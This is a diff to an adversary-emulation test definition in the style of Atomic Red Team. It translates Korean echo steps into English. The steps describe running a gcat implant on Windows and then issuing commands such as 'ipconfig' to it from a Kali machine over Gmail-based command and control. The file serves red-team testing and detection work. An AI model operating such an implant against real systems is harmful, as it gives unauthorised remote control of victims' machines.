@@ -8,17 +8,16 @@ atomic_tests:
   supported_platforms:
   - windows
   executor:
-    steps: |
-      echo 클라이언트 (in Windows)
+    command: |
+      echo client (in Windows)
       echo 1. Open cmd.exe 
-      echo 2. cd <implant.py 위치>
+      echo 2. cd (implant.py PATH)
       echo 3. implant.py
-
-      echo 공격자 서버 (in kali Linux)
+      echo Attacker (in kali Linux)
       echo 4. cd /home/kali/Desktop/gcat/gcat-master
       echo 5. python gcat.py -list     
-      echo 6. python gcat.py -id <id> -cmd 'ipconfig'
-      echo 7. python gcat.py -id <id> -jobid <jobid> 
-      echo 8. 이메일에서 결과 확인 (gcat.py, implant.py에 id/pw 존재)
+      echo 6. python gcat.py -id (id) -cmd 'ipconfig'
+      echo 7. python gcat.py -id (id) -jobid (jobid) 
+      echo 8. check your mail in gmail (gcat.py, implant.py - id/pw)
     name: command_prompt
     elevation_required: false
